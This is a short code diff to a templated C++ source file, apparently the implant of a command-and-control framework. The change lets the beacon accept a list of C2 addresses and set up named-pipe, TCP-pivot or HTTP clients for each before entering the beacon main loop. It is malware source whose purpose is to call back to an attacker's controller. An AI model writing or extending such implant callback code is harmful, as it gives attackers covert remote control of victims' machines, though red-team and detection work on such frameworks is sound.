@@ -515,19 +515,27 @@ int Entry() {
 #endif
 #ifdef  PIVOT
 #ifdef SMBPIVOT
-    unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "{{.Config.C2}}" });
+    // {{range $index, $value := .Config.C2}}
+    unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "{{$value}}" });
+    // {{end}} - range
 #endif
 #ifdef TCPPIVOT
-    unique_ptr<IClient> cli = make_unique<TCPClient>(string{ "{{.Config.C2}}" });
+    // {{range $index, $value := .Config.C2}}
+    unique_ptr<IClient> cli = make_unique<TCPClient>(string{ "{{$value}}" });
+    // {{end}} - range
 #endif
 #endif
 #ifdef HTTP
-    unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "{{.Config.C2}}" }, 10, 10, 10);
+    // {{range $index, $value := .Config.C2}}
+    unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "{{$value}}" }, 10, 10, 10);
+    // {{end}} - range
 #endif
     //  PIVOT
 
     instanceID = uuids::to_string(uuids::uuid_system_generator{}());
-    shared_ptr<Beacon> beacon = make_shared<Beacon>("{{.Config.C2}}", cli);
+    // {{range $index, $value := .Config.C2}}
+    shared_ptr<Beacon> beacon = make_shared<Beacon>("{{$value}}", cli);
+    // {{end}} - range
     while (1) {
         BeaconMainLoop(beacon);
 
